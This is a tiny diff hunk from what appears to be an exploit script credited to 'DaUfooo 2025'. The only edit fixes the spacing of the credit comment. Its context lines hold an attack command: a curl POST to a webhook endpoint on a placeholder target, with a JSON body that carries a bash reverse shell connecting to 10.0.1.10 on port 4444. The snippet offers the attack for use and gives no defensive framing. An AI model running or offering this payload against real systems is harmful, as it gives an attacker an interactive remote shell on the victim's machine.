@@ -3,4 +3,4 @@
 curl -X POST "http://TARGET:8080/trigger-webhook" \
 -d '{"data": "bash -i >& /dev/tcp/10.0.1.10/4444 0>&1"}'
 
-//By DaUfooo 2025
+// By DaUfooo 2025
